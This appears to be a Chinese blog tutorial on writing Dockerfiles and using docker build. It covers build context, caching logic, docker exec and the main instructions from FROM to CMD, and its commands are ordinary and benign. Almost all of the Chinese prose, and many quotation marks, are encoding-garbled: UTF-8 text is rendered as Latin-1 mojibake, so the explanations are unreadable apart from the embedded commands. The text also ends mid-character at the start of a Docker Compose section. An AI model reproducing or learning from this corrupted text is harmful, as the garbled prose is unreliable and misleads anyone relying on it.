["app.py"] ä»Ž Docker Hub ä¸Š pull ä¸‹ python 2.7 çš„åŸºç¡€é•œåƒ æ˜¾ç¤ºç»´æŠ¤è€…çš„ä¿¡æ¯ copy å½“å‰ç›®å½•åˆ°å®¹å™¨ä¸­çš„ /app ç›®å½•ä¸‹ å¤åˆ¶æœ¬åœ°ä¸»æœºçš„ &lt;src&gt; ( Dockerfile æ‰€åœ¨ç›®å½•çš„ç›¸å¯¹è·¯å¾„)åˆ°å®¹å™¨é‡Œ &lt;dest&gt; æŒ‡å®šå·¥ä½œè·¯å¾„ä¸º /app å®‰è£…ä¾èµ–åŒ… æš´éœ² 5000 ç«¯å£ å¯åŠ¨ app è¿™ä¸ªä¾‹å­æ˜¯å¯åŠ¨ä¸€ä¸ª python flask app çš„ Dockerfile ( flask æ˜¯ python çš„ä¸€ä¸ªè½»é‡çš„ web æ¡†æž¶)ï¼Œç›¸ä¿¡å¤§å®¶ä»Žè¿™ä¸ªä¾‹å­ä¸­èƒ½å¤Ÿç¨å¾®ç†è§£äº†Dockfileçš„ç»„æˆä»¥åŠæŒ‡ä»¤çš„ç¼–å†™è¿‡ç¨‹ã€‚ æž„å»ºé•œåƒdocker build å‘½ä»¤ä¼šæ ¹æ® Dockerfile æ–‡ä»¶åŠä¸Šä¸‹æ–‡æž„å»ºæ–° Docker é•œåƒã€‚æž„å»ºä¸Šä¸‹æ–‡æ˜¯æŒ‡ Dockerfile æ‰€åœ¨çš„æœ¬åœ°è·¯å¾„æˆ–ä¸€ä¸ªURLï¼ˆGitä»“åº“åœ°å€ï¼‰ã€‚æž„å»ºä¸Šä¸‹æ–‡çŽ¯å¢ƒä¼šè¢«é€’å½’å¤„ç†ï¼Œæ‰€ä»¥æž„å»ºæ‰€æŒ‡å®šçš„è·¯å¾„è¿˜åŒ…æ‹¬äº†å­ç›®å½•ï¼Œè€ŒURLè¿˜åŒ…æ‹¬äº†å…¶ä¸­æŒ‡å®šçš„å­æ¨¡å—ã€‚ å°†å½“å‰ç›®å½•åšä¸ºæž„å»ºä¸Šä¸‹æ–‡æ—¶ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·ä½¿ç”¨docker buildå‘½ä»¤æž„å»ºé•œåƒï¼š 123docker build .Sending build context to Docker daemon 6.51 MB... è¯´æ˜Žï¼šæž„å»ºä¼šåœ¨ Docker åŽå°å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰ä¸­æ‰§è¡Œï¼Œè€Œä¸æ˜¯CLIä¸­ã€‚æž„å»ºå‰ï¼Œæž„å»ºè¿›ç¨‹ä¼šå°†å…¨éƒ¨å†…å®¹ï¼ˆé€’å½’ï¼‰å‘é€åˆ°å®ˆæŠ¤è¿›ç¨‹ã€‚å¤§å¤šæƒ…å†µä¸‹ï¼Œåº”è¯¥å°†ä¸€ä¸ªç©ºç›®å½•ä½œä¸ºæž„å»ºä¸Šä¸‹æ–‡çŽ¯å¢ƒï¼Œå¹¶å°† Dockerfile æ–‡ä»¶æ”¾åœ¨è¯¥ç›®å½•ä¸‹ã€‚ åœ¨æž„å»ºä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨çš„ Dockerfile æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªæž„å»ºæŒ‡ä»¤æ–‡ä»¶ã€‚ä¸ºäº†æé«˜æž„å»ºæ€§èƒ½ï¼Œå¯ä»¥é€šè¿‡.dockerignoreæ–‡ä»¶æŽ’é™¤ä¸Šä¸‹æ–‡ç›®å½•ä¸‹ä¸éœ€è¦çš„æ–‡ä»¶å’Œç›®å½•ã€‚ åœ¨ Docker æž„å»ºé•œåƒçš„ç¬¬ä¸€æ­¥ï¼Œdocker CLI ä¼šå…ˆåœ¨ä¸Šä¸‹æ–‡ç›®å½•ä¸­å¯»æ‰¾.dockerignoreæ–‡ä»¶ï¼Œæ ¹æ®.dockerignore æ–‡ä»¶æŽ’é™¤ä¸Šä¸‹æ–‡ç›®å½•ä¸­çš„éƒ¨åˆ†æ–‡ä»¶å’Œç›®å½•ï¼Œç„¶åŽæŠŠå‰©ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ä¼ é€’ç»™ Docker æœåŠ¡ã€‚ Dockerfile ä¸€èˆ¬ä½äºŽæž„å»ºä¸Šä¸‹æ–‡çš„æ ¹ç›®å½•ä¸‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡-fæŒ‡å®šè¯¥æ–‡ä»¶çš„ä½ç½®ï¼š 1docker build -f /path/to/a/Dockerfile . æž„å»ºæ—¶ï¼Œè¿˜å¯ä»¥é€šè¿‡-tå‚æ•°æŒ‡å®šæž„å»ºæˆé•œåƒçš„ä»“åº“ã€æ ‡ç­¾ã€‚ é•œåƒæ ‡ç­¾1docker build -t nginx/v3 . å¦‚æžœå­˜åœ¨å¤šä¸ªä»“åº“ä¸‹ï¼Œæˆ–ä½¿ç”¨å¤šä¸ªé•œåƒæ ‡ç­¾ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤šä¸ª-tå‚æ•°ï¼š 1docker build -t nginx/v3:1.0.2 -t nginx/v3:latest . åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹æ‰§è¡Œ Dockerfile ä¸­çš„æŒ‡ä»¤å‰ï¼Œé¦–å…ˆä¼šå¯¹ Dockerfile è¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œæœ‰è¯­æ³•é”™è¯¯æ—¶ä¼šè¿”å›žï¼š 123docker build -t nginx/v3 .Sending build context to Docker daemon 2.048 kBError response from daemon: Unknown instruction: RUNCMD å…¶å®ƒ docker build çš„ç”¨æ³• ç›´æŽ¥ç”¨ Git repo è¿›è¡Œæž„å»º 12345678$ docker build https://github.com/twang2218/gitlab-ce-zh.git#:11.1Sending build context to Docker daemon 2.048 kBStep 1 : FROM gitlab/gitlab-ce:11.1.0-ce.011.1.0-ce.0: Pulling from gitlab/gitlab-ceaed15891ba52: Already exists773ae8583d14: Already exists... è¿™è¡Œå‘½ä»¤æŒ‡å®šäº†æž„å»ºæ‰€éœ€çš„ Git repoï¼Œå¹¶ä¸”æŒ‡å®šé»˜è®¤çš„ master åˆ†æ”¯ï¼Œæž„å»ºç›®å½•ä¸º /11.1/ï¼Œç„¶åŽ Docker å°±ä¼šè‡ªå·±åŽ» git clone è¿™ä¸ªé¡¹ç›®ã€åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ã€å¹¶è¿›å…¥åˆ°æŒ‡å®šç›®å½•åŽå¼€å§‹æž„å»ºã€‚ ç”¨ç»™å®šçš„ tar åŽ‹ç¼©åŒ…æž„å»º 1$ docker build http://server/context.tar.gz å¦‚æžœæ‰€ç»™å‡ºçš„ URL ä¸æ˜¯ä¸ª Git repoï¼Œè€Œæ˜¯ä¸ª tar åŽ‹ç¼©åŒ…ï¼Œé‚£ä¹ˆ Docker å¼•æ“Žä¼šä¸‹è½½è¿™ä¸ªåŒ…ï¼Œå¹¶è‡ªåŠ¨è§£åŽ‹ç¼©ï¼Œä»¥å…¶ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œå¼€å§‹æž„å»ºã€‚ ä»Žæ ‡å‡†è¾“å…¥ä¸­è¯»å– Dockerfile è¿›è¡Œæž„å»º 1docker build - &lt; Dockerfile or cat Dockerfile | docker build - å¦‚æžœæ ‡å‡†è¾“å…¥ä¼ å…¥çš„æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œåˆ™å°†å…¶è§†ä¸º Dockerfileï¼Œå¹¶å¼€å§‹æž„å»ºã€‚è¿™ç§å½¢å¼ç”±äºŽç›´æŽ¥ä»Žæ ‡å‡†è¾“å…¥ä¸­è¯»å– Dockerfile çš„å†…å®¹ï¼Œå®ƒæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œå› æ­¤ä¸å¯ä»¥åƒå…¶ä»–æ–¹æ³•é‚£æ ·å¯ä»¥å°†æœ¬åœ°æ–‡ä»¶ COPY è¿›é•œåƒä¹‹ç±»çš„äº‹æƒ…ã€‚ ä»Žæ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸Šä¸‹æ–‡åŽ‹ç¼©åŒ…è¿›è¡Œæž„å»º 1$ docker build - &lt; context.tar.gz å¦‚æžœå‘çŽ°æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æ ¼å¼æ˜¯ gzipã€bzip2 ä»¥åŠ xz çš„è¯ï¼Œå°†ä¼šä½¿å…¶ä¸ºä¸Šä¸‹æ–‡åŽ‹ç¼©åŒ…ï¼Œç›´æŽ¥å°†å…¶å±•å¼€ï¼Œå°†é‡Œé¢è§†ä¸ºä¸Šä¸‹æ–‡ï¼Œå¹¶å¼€å§‹æž„å»ºã€‚ ç¼“å­˜Docker å®ˆæŠ¤è¿›ç¨‹ä¼šä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œ Dockerfile ä¸­çš„æŒ‡ä»¤ï¼Œè€Œä¸”ä¼šåœ¨æ¯ä¸€æ­¥æäº¤å¹¶ç”Ÿæˆä¸€ä¸ªæ–°é•œåƒï¼Œæœ€åŽä¼šè¾“å‡ºæœ€ç»ˆé•œåƒçš„IDã€‚ç”Ÿæˆå®ŒæˆåŽï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ä¼šè‡ªåŠ¨æ¸…ç†ä½ å‘é€çš„ä¸Šä¸‹æ–‡ã€‚ Dockerfileæ–‡ä»¶ä¸­çš„æ¯æ¡æŒ‡ä»¤ä¼šè¢«ç‹¬ç«‹æ‰§è¡Œï¼Œå¹¶ä¼šåˆ›å»ºä¸€ä¸ªæ–°é•œåƒï¼ŒRUN cd /tmpç­‰å‘½ä»¤ä¸ä¼šå¯¹ä¸‹æ¡æŒ‡ä»¤äº§ç”Ÿå½±å“ã€‚ Docker ä¼šé‡ç”¨å·²ç”Ÿæˆçš„ä¸­é—´é•œåƒï¼Œä»¥åŠ é€Ÿdocker buildçš„æž„å»ºé€Ÿåº¦ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨äº†ç¼“å­˜é•œåƒçš„æ‰§è¡Œè¿‡ç¨‹ï¼š 1234567891011121314$ docker build -t svendowideit/ambassador .Sending build context to Docker daemon 15.36 kBStep 1/4 : FROM alpine:3.2 ---&gt; 31f630c65071Step 2/4 : MAINTAINER SvenDowideit@home.org.au ---&gt; Using cache ---&gt; 2a1c91448f5fStep 3/4 : RUN apk update &amp;&amp; apk add socat &amp;&amp; rm -r /var/cache/ ---&gt; Using cache ---&gt; 21ed6e7fbb73Step 4/4 : CMD env | grep _TCP= | (sed 's/.*_PORT_\([0-9]*\)_TCP=tcp:\/\/\(.*\):\(.*\)/socat -t 100000000 TCP4-LISTEN:\1,fork,reuseaddr TCP4:\2:\3 \&amp;/' &amp;&amp; echo wait) | sh ---&gt; Using cache ---&gt; 7ea8aef582ccSuccessfully built 7ea8aef582cc æž„å»ºç¼“å­˜ä»…ä¼šä½¿ç”¨æœ¬åœ°çˆ¶ç”Ÿæˆé“¾ä¸Šçš„é•œåƒï¼Œå¦‚æžœä¸æƒ³ä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„é•œåƒï¼Œä¹Ÿå¯ä»¥é€šè¿‡--cache-fromæŒ‡å®šç¼“å­˜ã€‚æŒ‡å®šåŽå°†ä¸å†ä½¿ç”¨æœ¬åœ°ç”Ÿæˆçš„é•œåƒé“¾ï¼Œè€Œæ˜¯ä»Žé•œåƒä»“åº“ä¸­ä¸‹è½½ã€‚ å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘Docker å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘å…¶å®žå°±æ˜¯æ ‘åž‹ç»“æž„æ ¹æ® Dockerfile æŒ‡ä»¤éåŽ†å­èŠ‚ç‚¹çš„è¿‡ç¨‹ã€‚ä¸‹å›¾å¯ä»¥è¯´æ˜Žè¿™ä¸ªé€»è¾‘ã€‚ 12345678910111213141516 FROM base_image:version Dockerfile: +----------+ FROM base_image:version |base image| RUN cmd1 --&gt; use cache because we found base image +-----X----+ RUN cmd11 --&gt; use cache because we found cmd1 / \ / \ RUN cmd1 RUN cmd2 Dockerfile: +------+ +------+ FROM base_image:version |image1| |image2| RUN cmd2 --&gt; use cache because we found base image +---X--+ +------+ RUN cmd21 --&gt; not use cache because there's no child node / \ running cmd21, so we build a new image here / \RUN cmd11 RUN cmd12+-------+ +-------+|image11| |image12|+-------+ +-------+ å¤§éƒ¨åˆ†æŒ‡ä»¤å¯ä»¥æ ¹æ®ä¸Šè¿°é€»è¾‘åŽ»å¯»æ‰¾ç¼“å­˜ï¼Œé™¤äº† ADD å’Œ COPY ã€‚è¿™ä¸¤ä¸ªæŒ‡ä»¤ä¼šå¤åˆ¶æ–‡ä»¶å†…å®¹åˆ°é•œåƒå†…ï¼Œé™¤äº†æŒ‡ä»¤ç›¸åŒä»¥å¤–ï¼ŒDocker è¿˜ä¼šæ£€æŸ¥æ¯ä¸ªæ–‡ä»¶å†…å®¹æ ¡éªŒ(ä¸åŒ…æ‹¬æœ€åŽä¿®æ”¹æ—¶é—´å’Œæœ€åŽè®¿é—®æ—¶é—´)ï¼Œå¦‚æžœæ ¡éªŒä¸ä¸€è‡´ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç¼“å­˜ã€‚ é™¤äº†è¿™ä¸¤ä¸ªå‘½ä»¤ï¼ŒDocker å¹¶ä¸ä¼šåŽ»æ£€æŸ¥å®¹å™¨å†…çš„æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚ RUN apt-get -y updateï¼Œæ¯æ¬¡æ‰§è¡Œæ—¶æ–‡ä»¶å¯èƒ½éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯ Docker è®¤ä¸ºå‘½ä»¤ä¸€è‡´ï¼Œä¼šç»§ç»­ä½¿ç”¨ç¼“å­˜ã€‚è¿™æ ·ä¸€æ¥ï¼Œä»¥åŽæž„å»ºæ—¶éƒ½ä¸ä¼šå†é‡æ–°è¿è¡Œapt-get -y updateã€‚ å¦‚æžœ Docker æ²¡æœ‰æ‰¾åˆ°å½“å‰æŒ‡ä»¤çš„ç¼“å­˜ï¼Œåˆ™ä¼šæž„å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼Œå¹¶ä¸”ä¹‹åŽçš„æ‰€æœ‰æŒ‡ä»¤éƒ½ä¸ä¼šå†åŽ»å¯»æ‰¾ç¼“å­˜ã€‚ ä¿®æ”¹å®¹å™¨å†…å®¹å®¹å™¨å¯åŠ¨åŽï¼Œéœ€è¦å¯¹å®¹å™¨å†…çš„æ–‡ä»¶è¿›è¡Œè¿›ä¸€æ­¥çš„å®Œå–„ï¼Œå¯ä»¥ä½¿ç”¨docker exec -it xx bashå‘½ä»¤å†æ¬¡è¿›è¡Œä¿®æ”¹ï¼Œä»¥ä¸Šé¢çš„ç¤ºä¾‹ä¸ºåŸºç¡€ï¼Œä¿®æ”¹ nginx å¯åŠ¨é¡µé¢å†…å®¹ï¼š 1234docker exec -it docker_nginx_v1 bashroot@3729b97e8226:/# echo '&lt;h1&gt;Hello, Docker neo!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.htmlroot@3729b97e8226:/# exitexit ä»¥äº¤äº’å¼ç»ˆç«¯æ–¹å¼è¿›å…¥ docker_nginx_v1 å®¹å™¨ï¼Œå¹¶æ‰§è¡Œäº† bash å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯èŽ·å¾—ä¸€ä¸ªå¯æ“ä½œçš„ Shellã€‚ ä¿®æ”¹äº†å®¹å™¨çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ”¹åŠ¨äº†å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œå¯ä»¥é€šè¿‡ docker diff å‘½ä»¤çœ‹åˆ°å…·ä½“çš„æ”¹åŠ¨ 12docker diff docker_nginx_v1 ... Dockerfileå¸¸ç”¨æŒ‡ä»¤æ ¹æ®ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»å·®ä¸å¤šçŸ¥é“äº†Dockerfileçš„ç»„æˆä»¥åŠæŒ‡ä»¤çš„ç¼–å†™è¿‡ç¨‹ï¼Œæˆ‘ä»¬å†æ¥ç†è§£ä¸€ä¸‹è¿™äº›å¸¸ç”¨å‘½ä»¤å°±ä¼šå¾—å¿ƒåº”æ‰‹äº†ã€‚ ç”±äºŽ Dockerfile ä¸­æ‰€æœ‰çš„å‘½ä»¤éƒ½æ˜¯ä»¥ä¸‹æ ¼å¼ï¼šINSTRUCTION argument ï¼ŒæŒ‡ä»¤ (INSTRUCTION) ä¸åˆ†å¤§å°å†™ï¼Œä½†æ˜¯æŽ¨èå¤§å†™ï¼Œå’Œsqlè¯­å¥æ˜¯ä¸æ˜¯å¾ˆç›¸ä¼¼å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬æ­£å¼æ¥è®²è§£ä¸€ä¸‹è¿™äº›æŒ‡ä»¤é›†å§ã€‚ FROM FROM æ˜¯ç”¨äºŽæŒ‡å®šåŸºç¡€çš„ images ï¼Œä¸€èˆ¬æ ¼å¼ä¸º FROM &lt;image&gt; or FORM &lt;image&gt;:&lt;tag&gt; ï¼Œæ‰€æœ‰çš„ Dockerfile éƒ½ç”¨è¯¥ä»¥ FROM å¼€å¤´ï¼ŒFROM å‘½ä»¤æŒ‡æ˜Ž Dockerfile æ‰€åˆ›å»ºçš„é•œåƒæ–‡ä»¶ä»¥ä»€ä¹ˆé•œåƒä¸ºåŸºç¡€ï¼ŒFROM ä»¥åŽçš„æ‰€æœ‰æŒ‡ä»¤éƒ½ä¼šåœ¨ FROM çš„åŸºç¡€ä¸Šè¿›è¡Œåˆ›å»ºé•œåƒã€‚å¯ä»¥åœ¨åŒä¸€ä¸ª Dockerfile ä¸­å¤šæ¬¡ä½¿ç”¨ FROM å‘½ä»¤ç”¨äºŽåˆ›å»ºå¤šä¸ªé•œåƒã€‚æ¯”å¦‚æˆ‘ä»¬è¦æŒ‡å®š python 2.7 çš„åŸºç¡€é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥åƒå¦‚ä¸‹å†™æ³•ä¸€æ ·ï¼š 1FROM python:2.7 MAINTAINER MAINTAINER æ˜¯ç”¨äºŽæŒ‡å®šé•œåƒåˆ›å»ºè€…å’Œè”ç³»æ–¹å¼ï¼Œä¸€èˆ¬æ ¼å¼ä¸º MAINTAINER &lt;name&gt; ã€‚è¿™é‡Œæˆ‘è®¾ç½®æˆæˆ‘çš„ ID å’Œé‚®ç®±ï¼š 1MAINTAINER QYMUA &lt;qymuao3o@gmail.com&gt; COPY COPY æ˜¯ç”¨äºŽå¤åˆ¶æœ¬åœ°ä¸»æœºçš„ &lt;src&gt; (ä¸º Dockerfile æ‰€åœ¨ç›®å½•çš„ç›¸å¯¹è·¯å¾„)åˆ°å®¹å™¨ä¸­çš„ &lt;dest&gt;ã€‚ å½“ä½¿ç”¨æœ¬åœ°ç›®å½•ä¸ºæºç›®å½•æ—¶ï¼ŒæŽ¨èä½¿ç”¨ COPY ã€‚ä¸€èˆ¬æ ¼å¼ä¸º COPY &lt;src&gt;&lt;dest&gt; ã€‚ä¾‹å¦‚æˆ‘ä»¬è¦æ‹·è´å½“å‰ç›®å½•åˆ°å®¹å™¨ä¸­çš„ /app ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ“ä½œï¼š 1COPY . /app å’Œ RUN æŒ‡ä»¤ä¸€æ ·ï¼Œä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§ç±»ä¼¼äºŽå‘½ä»¤è¡Œï¼Œä¸€ç§ç±»ä¼¼äºŽå‡½æ•°è°ƒç”¨=&gt;COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;æºè·¯å¾„1&gt;&quot;,... &quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;] ADD(æ›´é«˜çº§çš„å¤åˆ¶æ–‡ä»¶) ADD æŒ‡ä»¤å’Œ COPY çš„æ ¼å¼å’Œæ€§è´¨åŸºæœ¬ä¸€è‡´ã€‚ä½†æ˜¯åœ¨ COPY åŸºç¡€ä¸Šå¢žåŠ äº†ä¸€äº›åŠŸèƒ½ã€‚ æ¯”å¦‚ &lt;æºè·¯å¾„&gt; å¯ä»¥æ˜¯ä¸€ä¸ª URLï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒDocker å¼•æ“Žä¼šè¯•å›¾åŽ»ä¸‹è½½è¿™ä¸ªé“¾æŽ¥çš„æ–‡ä»¶æ”¾åˆ° &lt;ç›®æ ‡è·¯å¾„&gt; åŽ»ã€‚ä¸‹è½½åŽçš„æ–‡ä»¶æƒé™è‡ªåŠ¨è®¾ç½®ä¸º 600ï¼Œå¦‚æžœè¿™å¹¶ä¸æ˜¯æƒ³è¦çš„æƒé™ï¼Œé‚£ä¹ˆè¿˜éœ€è¦å¢žåŠ é¢å¤–çš„ä¸€å±‚ RUN è¿›è¡Œæƒé™è°ƒæ•´ï¼Œå¦å¤–ï¼Œå¦‚æžœä¸‹è½½çš„æ˜¯ä¸ªåŽ‹ç¼©åŒ…ï¼Œéœ€è¦è§£åŽ‹ç¼©ï¼Œä¹Ÿä¸€æ ·è¿˜éœ€è¦é¢å¤–çš„ä¸€å±‚ RUN æŒ‡ä»¤è¿›è¡Œè§£åŽ‹ç¼©ã€‚æ‰€ä»¥ä¸å¦‚ç›´æŽ¥ä½¿ç”¨ RUN æŒ‡ä»¤ï¼Œç„¶åŽä½¿ç”¨ wget æˆ–è€… curl å·¥å…·ä¸‹è½½ï¼Œå¤„ç†æƒé™ã€è§£åŽ‹ç¼©ã€ç„¶åŽæ¸…ç†æ— ç”¨æ–‡ä»¶æ›´åˆç†ã€‚å› æ­¤ï¼Œè¿™ä¸ªåŠŸèƒ½å…¶å®žå¹¶ä¸å®žç”¨ï¼Œè€Œä¸”ä¸æŽ¨èä½¿ç”¨ã€‚ å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒADD æŒ‡ä»¤ä¼šä»¤é•œåƒæž„å»ºç¼“å­˜å¤±æ•ˆï¼Œä»Žè€Œå¯èƒ½ä¼šä»¤é•œåƒæž„å»ºå˜å¾—æ¯”è¾ƒç¼“æ…¢ã€‚ å› æ­¤åœ¨ COPY å’Œ ADD æŒ‡ä»¤ä¸­é€‰æ‹©çš„æ—¶å€™ï¼Œå¯ä»¥éµå¾ªè¿™æ ·çš„åŽŸåˆ™ï¼Œæ‰€æœ‰çš„æ–‡ä»¶å¤åˆ¶å‡ä½¿ç”¨ COPY æŒ‡ä»¤ï¼Œä»…åœ¨éœ€è¦è‡ªåŠ¨è§£åŽ‹ç¼©çš„åœºåˆä½¿ç”¨ ADDã€‚ WORKDIR WORKDIR ç”¨äºŽé…åˆ RUNï¼ŒCMDï¼ŒENTRYPOINT å‘½ä»¤è®¾ç½®å½“å‰å·¥ä½œè·¯å¾„ã€‚å¯ä»¥è®¾ç½®å¤šæ¬¡ï¼Œå¦‚æžœæ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™ç›¸å¯¹å‰ä¸€ä¸ª WORKDIR å‘½ä»¤ã€‚é»˜è®¤è·¯å¾„ä¸º/ã€‚ä¸€èˆ¬æ ¼å¼ä¸º WORKDIR /path/to/work/dir ã€‚ä¾‹å¦‚æˆ‘ä»¬è®¾ç½®/app è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š 1WORKDIR /app RUN RUN ç”¨äºŽå®¹å™¨å†…éƒ¨æ‰§è¡Œå‘½ä»¤ã€‚æ¯ä¸ª RUN å‘½ä»¤ç›¸å½“äºŽåœ¨åŽŸæœ‰çš„é•œåƒåŸºç¡€ä¸Šæ·»åŠ äº†ä¸€ä¸ªæ”¹åŠ¨å±‚ï¼ŒåŽŸæœ‰çš„é•œåƒä¸ä¼šæœ‰å˜åŒ–ã€‚shellæ ¼å¼ä¸º RUN &lt;command&gt; ã€‚ä¾‹å¦‚æˆ‘ä»¬è¦å®‰è£… python ä¾èµ–åŒ…ï¼Œæˆ‘ä»¬åšæ³•å¦‚ä¸‹ï¼š 1RUN pip install -r requirements.txt exec æ ¼å¼ï¼šRUN [&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;, &quot;å‚æ•°1&quot;, &quot;å‚æ•°2&quot;]ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚ Dockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼ŒRUN ä¹Ÿä¸ä¾‹å¤–ã€‚æ¯ä¸€ä¸ª RUN çš„è¡Œä¸ºï¼Œå°±å’Œåˆšæ‰æˆ‘ä»¬æ‰‹å·¥å»ºç«‹é•œåƒçš„è¿‡ç¨‹ä¸€æ ·ï¼šæ–°å»ºç«‹ä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œæ‰§è¡Œç»“æŸåŽï¼Œcommit è¿™ä¸€å±‚çš„ä¿®æ”¹ï¼Œæž„æˆæ–°çš„é•œåƒã€‚ EXPOSE EXPOSE å‘½ä»¤ç”¨æ¥æŒ‡å®šå¯¹å¤–å¼€æ”¾çš„ç«¯å£ã€‚ä¸€èˆ¬æ ¼å¼ä¸º EXPOSE &lt;port&gt; [&lt;port&gt;...] ä¾‹å¦‚ä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œå¼€æ”¾5000ç«¯å£ï¼š 1EXPOSE 5000 ENTRYPOINT ENTRYPOINT å¯ä»¥è®©ä½ çš„å®¹å™¨è¡¨çŽ°å¾—åƒä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºä¸€æ ·ã€‚ä¸€ä¸ª Dockerfile ä¸­åªèƒ½æœ‰ä¸€ä¸ª ENTRYPOINTï¼Œå¦‚æžœæœ‰å¤šä¸ªï¼Œåˆ™æœ€åŽä¸€ä¸ªç”Ÿæ•ˆã€‚ ENTRYPOINT å‘½ä»¤ä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼š ENTRYPOINT [â€œexecutableâ€, â€œparam1â€, â€œparam2â€] ï¼šæŽ¨èä½¿ç”¨çš„ execå½¢å¼ ENTRYPOINT command param1 param2 ï¼šshell å½¢å¼ ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªï¼Œæˆ‘ä»¬è¦å°† python é•œåƒå˜æˆå¯æ‰§è¡Œçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åŽ»åšï¼š 1ENTRYPOINT ["python"] CMD CMD å‘½ä»¤ç”¨äºŽå¯åŠ¨å®¹å™¨æ—¶é»˜è®¤æ‰§è¡Œçš„å‘½ä»¤ï¼ŒCMD å‘½ä»¤å¯ä»¥åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶çš„æƒ…å†µä¸‹å°±è¦ç”¨ ENTRYPOINT æŒ‡å®šä¸€ä¸ªï¼Œç„¶åŽ CMD å‘½ä»¤çš„å‚æ•°å°±ä¼šä½œä¸ºENTRYPOINTçš„å‚æ•°ã€‚ CMD å‘½ä»¤æœ‰ä¸‰ç§æ ¼å¼ï¼š CMD [â€œexecutableâ€,â€param1â€,â€param2â€]ï¼šæŽ¨èä½¿ç”¨çš„ exec å½¢å¼ã€‚ CMD [â€œparam1â€,â€param2â€]ï¼šæ— å¯æ‰§è¡Œç¨‹åºå½¢å¼ CMD command param1 param2ï¼šshell å½¢å¼ã€‚ ä¸€ä¸ª Dockerfile ä¸­åªèƒ½æœ‰ä¸€ä¸ªCMDï¼Œå¦‚æžœæœ‰å¤šä¸ªï¼Œåˆ™æœ€åŽä¸€ä¸ªç”Ÿæ•ˆã€‚è€Œ CMD çš„ shell å½¢å¼é»˜è®¤è°ƒç”¨ /bin/sh -c æ‰§è¡Œå‘½ä»¤ã€‚ CMD å‘½ä»¤ä¼šè¢« Docker å‘½ä»¤è¡Œä¼ å…¥çš„å‚æ•°è¦†ç›–ï¼šdocker run busybox /bin/echo Hello Docker ä¼šæŠŠ CMD é‡Œçš„å‘½ä»¤è¦†ç›–ã€‚ ä¾‹å¦‚æˆ‘ä»¬è¦å¯åŠ¨ /app ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤å®žçŽ°ï¼š 1CMD ["app.py"] Dockerä¸‰å‰‘å®¢ä¹‹Composeé¡¹ç›®äº†è§£dockerä¸‰å‰‘å®¢docker-machineæ˜¯è§£å†³dockerè¿è¡ŒçŽ¯å¢ƒé—®é¢˜ã€‚ dockeræŠ€æœ¯æ˜¯åŸºäºŽLinuxå†…æ ¸çš„cgroupæŠ€æœ¯å®žçŽ°çš„ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æžœåœ¨éžLinuxå¹³å°ä¸Šä½¿ç”¨dockeræŠ€æœ¯éœ€è¦ä¾èµ–å®‰è£…Linuxç³»ç»Ÿçš„è™šæ‹Ÿæœºã€‚docker-machineå°±æ˜¯dockerå…¬å¸å®˜æ–¹æå‡ºçš„ï¼Œç”¨äºŽåœ¨å„ç§å¹³å°ä¸Šå¿«é€Ÿåˆ›å»ºå…·æœ‰dockeræœåŠ¡çš„è™šæ‹Ÿæœºçš„æŠ€æœ¯ã€‚ä½ 